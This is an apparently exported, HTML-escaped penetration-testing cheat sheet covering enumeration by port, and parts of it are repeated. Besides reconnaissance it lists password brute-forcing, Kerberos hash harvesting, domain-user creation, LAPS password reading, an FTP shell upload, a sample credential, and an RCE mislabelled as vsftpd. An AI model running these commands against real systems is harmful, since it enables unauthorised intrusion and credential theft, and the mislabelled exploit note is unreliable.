class=\"string\">&#x27;None&#x27;</span> -W <span class=\"string\">&#x27;WORKGROUP&#x27;</span> -I <span class=\"variable\">$IP</span> -U<span class=\"string\">&#x27;&#x27;</span>%<span class=\"string\">&#x27;&#x27;</span> 2&gt;&amp;1\nrpcclient -W <span class=\"string\">&#x27;WORKGROUP&#x27;</span> -c querydispinfo -U<span class=\"string\">&#x27;&#x27;</span>%<span class=\"string\">&#x27;&#x27;</span> <span class=\"variable\">$IP</span> 2&gt;&amp;1</code></pre>\n<pre><div class=\"caption\"><span>vulns</span></div><code class=\"highlight bash\">nmap --script smb-vuln* -p 139,445 <span class=\"variable\">$IP</span></code></pre>\n<pre><div class=\"caption\"><span>list shares</span></div><code class=\"highlight bash\">nmap --script <span class=\"string\">&quot;safe or smb-enum-*&quot;</span> -p 139,445 <span class=\"variable\">$IP</span> -oN recon/nmap.smb\n\n<span class=\"comment\"># [smbmap] list share (-r) and retrieve share (-A)</span>\nsmbmap -H <span class=\"variable\">$IP</span> -r -u <span class=\"string\">&#x27;anonymous&#x27;</span>\nsmbmap -H return.local -u svc-printer -p <span class=\"string\">&quot;1edFg43012\\!\\!&quot;</span> -r \n\nsmbclient -N -L \\\\\\\\<span class=\"variable\">$IP</span> \nsmbclient -N \\\\\\\\<span class=\"variable\">$IP</span>\\\\Share --client-protection=off\nsmbclient -U <span class=\"string\">&#x27;user%passwd&#x27;</span> -L //<span class=\"variable\">$IP</span>\nsmbclient //<span class=\"variable\">$IP</span>/Share -U user --pw-nt-hash <span class=\"variable\">$hash</span> -W <span class=\"variable\">$domain</span>\n\n<span class=\"comment\"># download files recursively</span>\nsmbclient <span class=\"string\">&#x27;\\\\\\\\$IP\\\\share&#x27;</span> -N -c <span class=\"string\">&#x27;prompt OFF ; recurse ON ; cd &quot;where\\from&quot; ; lcd &quot;where/to&quot; ; mget *&#x27;</span></code></pre>\n<pre><div class=\"caption\"><span>authentication bruteforce</span></div><code class=\"highlight bash\">hydra -L user.txt -P pass.txt <span class=\"variable\">$IP</span> smb\nacccheck -t <span class=\"variable\">$IP</span> -v -u user -P /usr/share/dirb/wordlist/common.txt</code></pre>\n\n<br>\n\n<h2 id=\"Port-143-TCP-993-TCP-IMAP-IMAPS\"><a href=\"#Port-143-TCP-993-TCP-IMAP-IMAPS\" class=\"headerlink\" title=\"Port 143&#x2F;TCP,993&#x2F;TCP - IMAP,IMAPS\"></a>Port 143&#x2F;TCP,993&#x2F;TCP - IMAP,IMAPS</h2><pre><code class=\"highlight bash\">nc -nv <span class=\"variable\">$IP</span> 143\nopenssl s_client -connect <span class=\"variable\">$IP</span>:993 -quiet</code></pre>\n<pre><div class=\"caption\"><span>GUI applications</span></div><code class=\"highlight bash\">evolution\nthunderbird</code></pre>\n<pre><div class=\"caption\"><span>IMAP commands</span></div><code class=\"highlight bash\"><span class=\"comment\"># login</span>\nA1 LOGIN <span class=\"string\">&quot;username&quot;</span> <span class=\"string\">&quot;password&quot;</span>\n<span class=\"comment\"># list folders/mailboxes</span>\nA1 LIST <span class=\"string\">&quot;&quot;</span> *\nA1 LIST INBOX *\nA1 LIST <span class=\"string\">&quot;Archive&quot;</span> *\n<span class=\"comment\"># select a mailbox</span>\nA1 SELECT INBOX\n<span class=\"comment\"># list messages</span>\nA1 FETCH 1:* (FLAGS)\nA1 UID FETCH 1:* (FLAGS)\n<span class=\"comment\"># view messages</span>\nA1 FETCH 2 body[text]\nA1 FETCH 2 all\nA1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])</code></pre>\n<pre><div class=\"caption\"><span>view and download messages with curl</span></div><code class=\"highlight bash\"><span class=\"comment\"># view</span>\ncurl -k <span class=\"string\">&#x27;imaps://$IP/&#x27;</span> --user user:pass\ncurl -k <span class=\"string\">&#x27;imaps://$IP/inbox_name?ALL&#x27;</span> --user user:pass \ncurl -k <span class=\"string\">&#x27;imaps://1.2.3.4/Drafts?TEXT password&#x27;</span> --user user:pass\n<span class=\"comment\"># download</span>\ncurl -k <span class=\"string\">&#x27;imaps://1.2.3.4/Drafts;MAILINDEX=1&#x27;</span> --user user:pass</code></pre>\n<pre><div class=\"caption\"><span>NTLM auth info disclosure</span></div><code class=\"highlight bash\">nmap -p 143,993 --script imap-ntlm-info <span class=\"variable\">$IP</span> -oN recon/nmap.imap-ntlm</code></pre>\n<pre><div class=\"caption\"><span>bruteforce passwords</span></div><code class=\"highlight bash\">hydra -I -V -F -l user -P /usr/share/wordlists/rockyou.txt <span class=\"variable\">$IP</span> imap \nhydra -S -V -l user -P /usr/share/wordlists/rockyou.txt -s 993 <span class=\"variable\">$IP</span> imap</code></pre>\n\n<br>\n\n<h2 id=\"Port-161-TCP-162-UDP-SNMP\"><a href=\"#Port-161-TCP-162-UDP-SNMP\" class=\"headerlink\" title=\"Port 161&#x2F;TCP,162&#x2F;UDP - SNMP\"></a>Port 161&#x2F;TCP,162&#x2F;UDP - SNMP</h2><pre><code class=\"highlight bash\">xprobe2 -v -p udp:161:open <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-389-TCP-636-TCP-3269-TCP-LDAP-tcpwrapped\"><a href=\"#Port-389-TCP-636-TCP-3269-TCP-LDAP-tcpwrapped\" class=\"headerlink\" title=\"Port 389&#x2F;TCP,636&#x2F;TCP,3269&#x2F;TCP - LDAP,tcpwrapped\"></a>Port 389&#x2F;TCP,636&#x2F;TCP,3269&#x2F;TCP - LDAP,tcpwrapped</h2><pre><div class=\"caption\"><span>enumeration</span></div><code class=\"highlight bash\">nmap -n -sV --script <span class=\"string\">&quot;ldap* and not brute&quot;</span> <span class=\"variable\">$IP</span> -oN recon/nmap.ldap</code></pre>\n<pre><div class=\"caption\"><span>ldapsearch</span></div><code class=\"highlight bash\"><span class=\"comment\"># null creds</span>\nldapsearch -x -H ldap://<span class=\"variable\">$IP</span> -D <span class=\"string\">&#x27;&#x27;</span> -w <span class=\"string\">&#x27;&#x27;</span> -b <span class=\"string\">&quot;DC=domain,DC=name&quot;</span>\n<span class=\"comment\"># authenticate</span>\nldapsearch -x -H ldap://<span class=\"variable\">$IP</span> -D <span class=\"string\">&#x27;$domain\\user&#x27;</span> -w <span class=\"string\">&#x27;password&#x27;</span> -b <span class=\"string\">&quot;CN=Remote Desktop Users,CN=Builtin,DC=domain,DC=name&quot;</span>\n<span class=\"comment\"># extract info anonymously</span>\nldapsearch -x -H ldaps://<span class=\"variable\">$IP</span>:636/ -s base -b <span class=\"string\">&#x27;&#x27;</span> <span class=\"string\">&quot;(objectClass=*)&quot;</span> <span class=\"string\">&quot;*&quot;</span> +\n<span class=\"comment\"># check admin password if LAPS is enabled</span>\nldapsearch -x -H ldap://<span class=\"variable\">$IP</span> -D <span class=\"string\">&#x27;$domain\\user&#x27;</span> -w <span class=\"string\">&#x27;password&#x27;</span> -b <span class=\"string\">&quot;dc=domain,dc=name&quot;</span> <span class=\"string\">&quot;(ms-MCS-AdmPwd=*)&quot;</span> ms-MCS-AdmPwd</code></pre>\n\n<br>\n\n<h2 id=\"Port-500-TCP-IKE\"><a href=\"#Port-500-TCP-IKE\" class=\"headerlink\" title=\"Port 500&#x2F;TCP - IKE\"></a>Port 500&#x2F;TCP - IKE</h2><blockquote>\n<p>Internet Key Exchange (IKE), used to establish an IPsec VPN</p>\n</blockquote>\n<pre><code class=\"highlight bash\">ike-scan -M <span class=\"variable\">$IP</span>\nike-scan -M --ikev2 <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-2049-TCP-NFS\"><a href=\"#Port-2049-TCP-NFS\" class=\"headerlink\" title=\"Port 2049&#x2F;TCP - NFS\"></a>Port 2049&#x2F;TCP - NFS</h2><pre><code class=\"highlight bash\">nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <span class=\"variable\">$IP</span> -oN recon/nmap.nfs-enum\nnmap --script <span class=\"string\">&quot;nfs-ls, nfs-showmount, nfs-statfs&quot;</span> <span class=\"variable\">$IP</span>- oN recon/nmap.nfs-list</code></pre>\n<pre><code class=\"highlight bash\">showmount -e <span class=\"variable\">$IP</span>\nmsfconsole -q -x <span class=\"string\">&quot;use auxiliary/scanner/nfs/nfsmount; set RHOSTS <span class=\"variable\">$IP</span>; run&quot;</span>\n<span class=\"comment\"># check config files</span>\n<span class=\"comment\"># /etc/exports</span>\n<span class=\"comment\"># /etc/lib/nfs/etab</span></code></pre>\n<pre><div class=\"caption\"><span>mount/unmount shares</span></div><code class=\"highlight bash\"><span class=\"comment\"># create mount point</span>\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">mkdir</span> /mnt/local_share\n<span class=\"comment\"># mount the opn share</span>\n<span class=\"built_in\">sudo</span> mount -t nfs -o rw,vers=2 <span class=\"variable\">$IP</span>:/share_name /mnt/local_share\n<span class=\"comment\"># unmount share</span>\n<span class=\"built_in\">sudo</span> umount /mnt/nfs-share\n\n<span class=\"comment\"># match the user with UID and GID if mounting a share with restricted permissions</span>\npython2 ~/tools/NfSpy/nfspy.py -o server=<span class=\"variable\">$IP</span>:/share_name,nfsport=2049/tcp,rw /mnt/local_share</code></pre>\n\n<br>\n\n<h2 id=\"Port-3306-TCP-MySQL\"><a href=\"#Port-3306-TCP-MySQL\" class=\"headerlink\" title=\"Port 3306&#x2F;TCP - MySQL\"></a>Port 3306&#x2F;TCP - MySQL</h2><pre><code class=\"highlight bash\">nmap -sV -Pn -T4 -vv -script=mysql* <span class=\"variable\">$IP</span> -p 3306 -oN recon/nmap.mysql</code></pre>\n<pre><div class=\"caption\"><span>interact with the DB</span></div><code class=\"highlight bash\">mysql -u<span class=\"string\">&#x27;root&#x27;</span> -p<span class=\"string\">&#x27;root&#x27;</span> -h <span class=\"variable\">$IP</span> -D database\nsqlitebrowser</code></pre>\n<pre><code class=\"highlight sql\"><span class=\"keyword\">show</span> databases;\nuse db_name;\n<span class=\"keyword\">show</span> tables;\n<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> table_name;\n<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> table_name \\G</code></pre>\n<pre><div class=\"caption\"><span>check for credentials</span></div><code class=\"highlight bash\">find / -<span class=\"built_in\">type</span> f -name wp-config.php 2&gt;/dev/null</code></pre>\n\n<br>\n\n<h2 id=\"Port-3389-TCP-RDP\"><a href=\"#Port-3389-TCP-RDP\" class=\"headerlink\" title=\"Port 3389&#x2F;TCP - RDP\"></a>Port 3389&#x2F;TCP - RDP</h2><pre><div class=\"caption\"><span>authenticate</span></div><code class=\"highlight bash\">xfreerdp /u:username /p:<span class=\"string\">&#x27;password&#x27;</span> /v:<span class=\"variable\">$IP</span> /f +clipboard <span class=\"comment\"># /d:domain /cert:ignore</span>\nrdesktop <span class=\"variable\">$IP</span> -d <span class=\"variable\">$domain</span> -u <span class=\"variable\">$username</span> -p <span class=\"string\">&#x27;$password&#x27;</span>\nremmina -c rdp://user@<span class=\"variable\">$IP</span></code></pre>\n<pre><div class=\"caption\"><span>check credentials</span></div><code class=\"highlight bash\">impacket-rdp_check <span class=\"variable\">$domain</span>/<span class=\"variable\">$username</span>:<span class=\"variable\">$password</span>@<span class=\"variable\">$IP</span>\n<span class=\"comment\"># look for an username upon connecting</span>\nrdesktop -u <span class=\"string\">&quot;&quot;</span> -a <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-6667-TCP-6697-TCP-IRC\"><a href=\"#Port-6667-TCP-6697-TCP-IRC\" class=\"headerlink\" title=\"Port 6667&#x2F;TCP,6697&#x2F;TCP - IRC\"></a>Port 6667&#x2F;TCP,6697&#x2F;TCP - IRC</h2><pre><div class=\"caption\"><span>manual inspection</span></div><code class=\"highlight bash\">nc -nv <span class=\"variable\">$IP</span> 6667 <span class=\"comment\"># connect to server</span>\nUSER admin * 0 admin ; NICK admin <span class=\"comment\"># authenticate</span>\nadmin? ADMIN <span class=\"comment\"># list commands</span></code></pre>\n<pre><div class=\"caption\"><span>irssi</span></div><code class=\"highlight bash\">irssi -c <span class=\"variable\">$IP</span> -p 6697 - /exit</code></pre>\n\n<br>\n\n<h2 id=\"Port-11211-TCP-memcache\"><a href=\"#Port-11211-TCP-memcache\" class=\"headerlink\" title=\"Port 11211&#x2F;TCP - memcache\"></a>Port 11211&#x2F;TCP - memcache</h2><pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;stats items&quot;</span> | nc -vn -w 1 <span class=\"variable\">$IP</span> 11211  <span class=\"comment\"># Get items of slabs with info</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;get &lt;item_name&gt;&quot;</span> | nc -vn -w 1 <span class=\"variable\">$IP</span> 11211  <span class=\"comment\"># Get saved info</span></code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 3 in a penetration test: Enumeration.<br>Try to find relevant info to enter the target machine.</p>\n<hr>","more":"<br>\n\n<h2 id=\"Port-21-TCP-FTP\"><a href=\"#Port-21-TCP-FTP\" class=\"headerlink\" title=\"Port 21&#x2F;TCP - FTP\"></a>Port 21&#x2F;TCP - FTP</h2><pre><code class=\"highlight bash\">nmap --script=*ftp* -p21 <span class=\"variable\">$IP</span> -oN recon/nmap.ftp\n\nftp-user-enum.pl -U users.txt -t <span class=\"variable\">$IP</span></code></pre>\n<pre><div class=\"caption\"><span>write permissions</span></div><code class=\"highlight bash\"><span class=\"comment\"># mount/unmount shares</span>\ncurlftpfs anonymous@<span class=\"variable\">$IP</span> ftp-local-mount-dir/\nfusermount -u ftp\n\n<span class=\"comment\"># upload files with curl</span>\ncurl -v -P - <span class=\"string\">&#x27;ftp://username:password@$IP/files/&#x27;</span> -T <span class=\"string\">&quot;/var/www/html/shell.sh&quot;</span>\n\n<span class=\"comment\"># upload files manually, depending on file type</span>\n&gt; ascii\n&gt; binary\n&gt; put <span class=\"variable\">$file</span></code></pre>\n<pre><div class=\"caption\"><span>no access to view files</span></div><code class=\"highlight bash\">quote PASV</code></pre>\n<pre><div class=\"caption\"><span>RCE vsftpd 1.3.5</span></div><code class=\"highlight mod_copy\">nc -v $IP 21\nsite cpfr /my/local/file\nsite cpto /directory/i-have/access-to</code></pre>\n<pre><div class=\"caption\"><span>download all files recursively</span></div><code class=\"highlight bash\">wget -r ftp://anonymous:@<span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-22-TCP-SSH\"><a href=\"#Port-22-TCP-SSH\" class=\"headerlink\" title=\"Port 22&#x2F;TCP - SSH\"></a>Port 22&#x2F;TCP - SSH</h2><pre><div class=\"caption\"><span>execute command upon login</span></div><code class=\"highlight bash\">ssh -t user@<span class=\"variable\">$IP</span> <span class=\"string\">&#x27;id; bash -l&#x27;</span></code></pre>\n<pre><div class=\"caption\"><span>passphrase-protected private key</span></div><code class=\"highlight bash\">ssh2john id_rsa &gt; <span class=\"built_in\">hash</span>\njohn <span class=\"built_in\">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>\n<pre><div class=\"caption\"><span>SSH tunnels</span></div><code class=\"highlight bash\"><span class=\"comment\"># local</span>\nssh -L <span class=\"variable\">$local_IP</span>:<span class=\"variable\">$local_port</span>:destination_IP:<span class=\"variable\">$destination_port</span> user@<span class=\"variable\">$SSH_server</span>\n<span class=\"comment\"># remote</span>\nssh -R <span class=\"variable\">$remote_IP</span>:<span class=\"variable\">$remote_port</span>:destination_IP:<span class=\"variable\">$destination_port</span> user@<span class=\"variable\">$SSH_server</span>\n<span class=\"comment\"># do not execute a command</span>\n<span class=\"comment\"># -N</span>\n<span class=\"comment\"># run in the background</span>\n<span class=\"comment\"># -f</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-23-TCP-Telnet\"><a href=\"#Port-23-TCP-Telnet\" class=\"headerlink\" title=\"Port 23&#x2F;TCP - Telnet\"></a>Port 23&#x2F;TCP - Telnet</h2><pre><code class=\"highlight bash\">nmap -n -sV -Pn --script <span class=\"string\">&quot;*telnet* and safe&quot;</span> -p 23 <span class=\"variable\">$IP</span> -oN recon/nmap.telnet</code></pre>\n\n<br>\n\n<h2 id=\"Port-25-465-587-TCP-SMTP\"><a href=\"#Port-25-465-587-TCP-SMTP\" class=\"headerlink\" title=\"Port 25,465,587&#x2F;TCP - SMTP\"></a>Port 25,465,587&#x2F;TCP - SMTP</h2><pre><code class=\"highlight bash\">nmap --script smtp-enum-users <span class=\"variable\">$IP</span> -oN recon/nmap.smtp-users\nnmap -p25 --script smtp-commands <span class=\"variable\">$IP</span> -oN recon/nmap.smtp-comm\n\n<span class=\"comment\"># if NTLM auth is enabled (WINDOWS)</span>\nnmap -sS -v --script=*-ntlm-info --script-timeout=60s <span class=\"variable\">$domain</span> -oN recon/nmap.smtp-ntlm</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># modes: EXPN, VRFY or RCPT (default: VRFY)</span>\nsmtp-user-enum -u <span class=\"variable\">$USER</span> -t <span class=\"variable\">$IP</span> -M <span class=\"variable\">$MODE</span></code></pre>\n<pre><code class=\"highlight bash\">msfconsole -q -x <span class=\"string\">&quot;use auxiliary/scanner/smtp/smtp_enum; set RHOSTS <span class=\"variable\">$IP</span>; run&quot;</span></code></pre>\n<pre><code class=\"highlight bash\">swaks --to user@example.com --server test-server.example.net</code></pre>\n\n<br>\n\n<h2 id=\"Port-43-TCP-WHOIS\"><a href=\"#Port-43-TCP-WHOIS\" class=\"headerlink\" title=\"Port 43&#x2F;TCP - WHOIS\"></a>Port 43&#x2F;TCP - WHOIS</h2><pre><code class=\"highlight bash\">whois -h <span class=\"variable\">$IP</span> -p 43 <span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span> | nc -vn <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-53-TCP-UDP-DNS\"><a href=\"#Port-53-TCP-UDP-DNS\" class=\"headerlink\" title=\"Port 53&#x2F;TCP&#x2F;UDP - DNS\"></a>Port 53&#x2F;TCP&#x2F;UDP - DNS</h2><pre><code class=\"highlight bash\">nmap -n --script <span class=\"string\">&quot;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&quot;</span> <span class=\"variable\">$IP</span> -oN recon/nmap.dns\ndnscan.py -d <span class=\"variable\">$domain</span> -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></pre>\n<pre><div class=\"caption\"><span>query info about the server</span></div><code class=\"highlight bash\">dig @<span class=\"variable\">$IP</span> <span class=\"variable\">$domain</span></code></pre>\n<pre><div class=\"caption\"><span>zone transfer (TCP)</span></div><code class=\"highlight bash\">dnsrecon -d <span class=\"variable\">$domain</span> -t axfr\ndig axfr <span class=\"variable\">$domain</span> ns08.<span class=\"variable\">$domain</span></code></pre>\n<pre><div class=\"caption\"><span>bruteforce subdomains</span></div><code class=\"highlight bash\">wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u <span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span> -H <span class=\"string\">&quot;Host: FUZZ.<span class=\"variable\">$domain</span>&quot;</span> --hl 7\ngobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u <span class=\"variable\">$domain</span>\nnmap -T4 -p 53 --script dns-brute <span class=\"variable\">$domain</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-69-TCP-TFTP\"><a href=\"#Port-69-TCP-TFTP\" class=\"headerlink\" title=\"Port 69&#x2F;TCP - TFTP\"></a>Port 69&#x2F;TCP - TFTP</h2><pre><code class=\"highlight bash\">nmap -n -Pn -sU -p69 -sV --script tftp-enum <span class=\"variable\">$IP</span> -oN recon/nmap.tftp</code></pre>\n<pre><div class=\"caption\"><span>download/upload</span></div><code class=\"highlight bash\">msfconsole -q -x <span class=\"string\">&quot;use auxiliary/admin/tftp/tftp_transfer_util; set RHOSTS <span class=\"variable\">$IP</span>; run&quot;</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-80-TCP-443-HTTPs-HTTP-HTTPS\"><a href=\"#Port-80-TCP-443-HTTPs-HTTP-HTTPS\" class=\"headerlink\" title=\"Port 80&#x2F;TCP,443&#x2F;HTTPs - HTTP,HTTPS\"></a>Port 80&#x2F;TCP,443&#x2F;HTTPs - HTTP,HTTPS</h2><pre><div class=\"caption\"><span>Enumerate web server based on .ds_store</span></div><code class=\"highlight bash\">python ds_walk.py -u <span class=\"variable\">$URL</span></code></pre>\n<pre><code class=\"highlight bash\">python3 iis_shortname_Scan.py <span class=\"variable\">$URL</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-88-TCP-UDP-Kerberos\"><a href=\"#Port-88-TCP-UDP-Kerberos\" class=\"headerlink\" title=\"Port 88&#x2F;TCP,UDP - Kerberos\"></a>Port 88&#x2F;TCP,UDP - Kerberos</h2><pre><div class=\"caption\"><span>enumerate users (need users list)</span></div><code class=\"highlight bash\">nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=<span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span>,userdb=/path/to/userlist <span class=\"variable\">$IP</span> -oN recon/nmap.kerberos-enum-u</code></pre>\n<pre><div class=\"caption\"><span>bruteforce passwords</span></div><code class=\"highlight bash\"><span class=\"comment\"># linux</span>\nkerbrute -domain <span class=\"variable\">$domain</span> -<span class=\"built_in\">users</span> users.txt -passwords passwords.txt -outputfile recon/kerbrute.out\n<span class=\"comment\"># windows</span>\n.\\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:<span class=\"variable\">$domain</span> /outfile:rubeus.txt</code></pre>\n<pre><div class=\"caption\"><span>harvest the non-preauth AS_REP responses</span></div><code class=\"highlight bash\">impacket-GetNPUsers <span class=\"variable\">$domain</span>/ -usersfile users.txt -format hashcat -outputfile files/hashes.out</code></pre>\n<pre><div class=\"caption\"><span>[with creds] get a list of SPNs (service principal names)</span></div><code class=\"highlight bash\">impacket-GetUserSPNs -request -dc-ip <span class=\"variable\">$IP</span> active.htb/svc_tgs</code></pre>\n\n<br>\n\n<h2 id=\"Port-110-TCP-995-TCP-POP3-POP3S\"><a href=\"#Port-110-TCP-995-TCP-POP3-POP3S\" class=\"headerlink\" title=\"Port 110&#x2F;TCP,995&#x2F;TCP - POP3,POP3S\"></a>Port 110&#x2F;TCP,995&#x2F;TCP - POP3,POP3S</h2><pre><div class=\"caption\"><span>grab banner</span></div><code class=\"highlight bash\">nc -nv <span class=\"variable\">$IP</span> 110\nopenssl s_client -crlf -connect <span class=\"variable\">$IP</span>:995</code></pre>\n<pre><div class=\"caption\"><span>NTLM info disclosure</span></div><code class=\"highlight bash\">nmap -p 110,995 --script pop3-ntlm-info <span class=\"variable\">$IP</span> -oN nmap/pop3-ntlm</code></pre>\n<pre><div class=\"caption\"><span>capabilities</span></div><code class=\"highlight bash\">nmap -p 110,995 --script pop3-capabilities <span class=\"variable\">$IP</span> -oN nmap/pop3-<span class=\"built_in\">cap</span></code></pre>\n<pre><div class=\"caption\"><span>commands</span></div><code class=\"highlight bash\">USER    Username or mailbox.\nPASS    Server/mailbox-specific password.\nSTAT    Number of messages <span class=\"keyword\">in</span> the mailbox.\nLIST    [ message# ] Messages summary.\nRETR    [ message# ] Retrieve selected message.\nDELE    [ message# ] Delete selected message.\nRSET    Reset the session. Restore deleted messages.\nNOOP    No-op. Keeps connection open.\nQUIT    End session.</code></pre>\n\n<br>\n\n<h2 id=\"Port-111-TCP-RPCbind\"><a href=\"#Port-111-TCP-RPCbind\" class=\"headerlink\" title=\"Port 111&#x2F;TCP - RPCbind\"></a>Port 111&#x2F;TCP - RPCbind</h2><pre><code class=\"highlight bash\">rpcinfo <span class=\"variable\">$IP</span>\n<span class=\"comment\"># RPC + NFS   = list, download, upload shares</span>\n<span class=\"comment\"># NIS         = ypbind - sensitive files</span>\n<span class=\"comment\"># RPC users   = rusersd - enumerate users</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-135-TCP-MSRPC\"><a href=\"#Port-135-TCP-MSRPC\" class=\"headerlink\" title=\"Port 135&#x2F;TCP - MSRPC\"></a>Port 135&#x2F;TCP - MSRPC</h2><pre><code class=\"highlight bash\">nmap -sV -script msrpc-enum -Pn <span class=\"variable\">$IP</span> -oN recon/nmap.msrpc</code></pre>\n<pre><div class=\"caption\"><span>dump</span></div><code class=\"highlight bash\"><span class=\"comment\"># RPC endpoints</span>\nimpacket-rpcdump <span class=\"variable\">$IP</span>\n\n<span class=\"comment\"># SAMR info</span>\nimpacket-samrdump <span class=\"variable\">$IP</span></code></pre>\n<pre><code class=\"highlight bash\">rpcclient -U <span class=\"string\">&quot;&quot;</span> -N <span class=\"variable\">$IP</span>\nrpcclient -U user%domain@<span class=\"variable\">$IP</span>\nrpcclient //<span class=\"variable\">$IP</span> -U <span class=\"variable\">$domain</span>/user%<span class=\"variable\">$hash</span> --pw-nt-hash</code></pre>\n<pre><div class=\"caption\"><span>commands</span></div><code class=\"highlight bash\">&gt; enumprinters\n&gt; enumdomains\n\n&gt; enumdomusers\n\n&gt; queryuser <span class=\"variable\">$username</span>\n\n&gt; enumdomgroups\n\n&gt; querygroup 0x<span class=\"variable\">$number</span>\n\n&gt; querydominfo\n&gt; querydispinfo\n&gt; enumprivs\n&gt; getdompwinfo\n&gt; getusrdompwinfo 0xnumber\n&gt; dsroledominfo\n&gt; netshareenum\n&gt; netshareenumall\n\n&gt; createdomuser <span class=\"variable\">$username</span>\n&gt; setuserinfo2 <span class=\"variable\">$username</span> 24 <span class=\"variable\">$password</span>\n&gt; lookupnames <span class=\"variable\">$username</span>\n\n&gt; chgpasswd <span class=\"variable\">$username</span> <span class=\"variable\">$old</span>-pass <span class=\"variable\">$new</span>-pass</code></pre>\n\n<br>\n\n<h2 id=\"Port-137-TCP-UDP-138-UDP-139-TCP-NetBIOS\"><a href=\"#Port-137-TCP-UDP-138-UDP-139-TCP-NetBIOS\" class=\"headerlink\" title=\"Port 137&#x2F;TCP&#x2F;UDP,138&#x2F;UDP,139&#x2F;TCP - NetBIOS\"></a>Port 137&#x2F;TCP&#x2F;UDP,138&#x2F;UDP,139&#x2F;TCP - NetBIOS</h2><pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <span class=\"variable\">$IP</span> -oN recon/nmap.nbtstat</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># linux</span>\nnmblookup -A <span class=\"variable\">$IP</span>\nnbtscan -v <span class=\"variable\">$IP</span>\n<span class=\"comment\"># windows</span>\nnbstat -A <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-139-TCP-445-TCP-NetBIOS-SMB\"><a href=\"#Port-139-TCP-445-TCP-NetBIOS-SMB\" class=\"headerlink\" title=\"Port 139&#x2F;TCP,445&#x2F;TCP - NetBIOS,SMB\"></a>Port 139&#x2F;TCP,445&#x2F;TCP - NetBIOS,SMB</h2><pre><code class=\"highlight bash\">enum4linux -avA <span class=\"variable\">$IP</span> &gt; recon/enum4linux.out\nenum4linux -avA <span class=\"variable\">$IP</span> -u user -p pass &gt; recon/enum4linux.out</code></pre>\n<pre><div class=\"caption\"><span>hostname</span></div><code class=\"highlight bash\">nmblookup -A <span class=\"variable\">$IP</span>\nnbtscan -r <span class=\"variable\">$NET</span></code></pre>\n<pre><div class=\"caption\"><span>domain info</span></div><code class=\"highlight bash\">polenum <span class=\"string\">&#x27;&#x27;</span>:<span class=\"string\">&#x27;&#x27;</span>@<span class=\"variable\">$IP</span> 2&gt;&amp;1</code></pre>\n<pre><div class=\"caption\"><span>server info</span></div><code class=\"highlight bash\">rpcclient -W <span class=\"string\">&#x27;WORKGROUP&#x27;</span> -U<span class=\"string\">&#x27;&#x27;</span>%<span class=\"string\">&#x27;&#x27;</span> -c <span class=\"string\">&#x27;srvinfo&#x27;</span> <span class=\"variable\">$IP</span> 2&gt;&amp;1</code></pre>\n<pre><div class=\"caption\"><span>version</span></div><code class=\"highlight bash\">msfconsole -q -x <span class=\"string\">&#x27;use /scanner/smb/smb_version ; set rhosts $IP; run&#x27;</span></code></pre>\n<pre><div class=\"caption\"><span>usernames</span></div><code class=\"highlight bash\">net rpc group members <span class=\"string\">&#x27;None&#x27;</span> -W <span class=\"string\">&#x27;WORKGROUP&#x27;</span> -I <span class=\"variable\">$IP</span> -U<span class=\"string\">&#x27;&#x27;</span>%<span class=\"string\">&#x27;&#x27;</span> 2&gt;&amp;1\nrpcclient -W <span class=\"string\">&#x27;WORKGROUP&#x27;</span> -c querydispinfo -U<span class=\"string\">&#x27;&#x27;</span>%<span class=\"string\">&#x27;&#x27;</span> <span class=\"variable\">$IP</span> 2&gt;&amp;1</code></pre>\n<pre><div class=\"caption\"><span>vulns</span></div><code class=\"highlight bash\">nmap --script smb-vuln* -p 139,445 <span class=\"variable\">$IP</span></code></pre>\n<pre><div class=\"caption\"><span>list shares</span></div><code class=\"highlight bash\">nmap --script <span class=\"string\">&quot;safe or smb-enum-*&quot;</span> -p 139,445 <span class=\"variable\">$IP</span> -oN recon/nmap.smb\n\n<span class=\"comment\"># [smbmap] list share (-r) and retrieve share (-A)</span>\nsmbmap -H <span class=\"variable\">$IP</span> -r -u <span class=\"string\">&#x27;anonymous&#x27;</span>\nsmbmap -H return.local -u svc-printer -p <span class=\"string\">&quot;1edFg43012\\!\\!&quot;</span> -r \n\nsmbclient -N -L \\\\\\\\<span class=\"variable\">$IP</span> \nsmbclient -N \\\\\\\\<span 